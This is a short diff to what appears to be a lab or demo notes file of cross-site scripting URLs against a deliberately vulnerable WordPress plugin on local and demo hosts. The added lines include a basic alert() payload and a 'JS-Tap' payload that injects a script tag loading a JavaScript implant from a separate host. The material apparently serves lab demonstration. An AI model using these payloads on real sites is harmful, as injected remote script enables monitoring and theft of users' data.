@@ -50,3 +50,16 @@ https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
 
 
+-----
+Local VM target server
+http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php
+
+Alert:
+http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+
+
+JS-Tap:
+http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://127.0.0.1:8444/lib/telemlib.js%27%3E%3C/script%3E
+
+
+
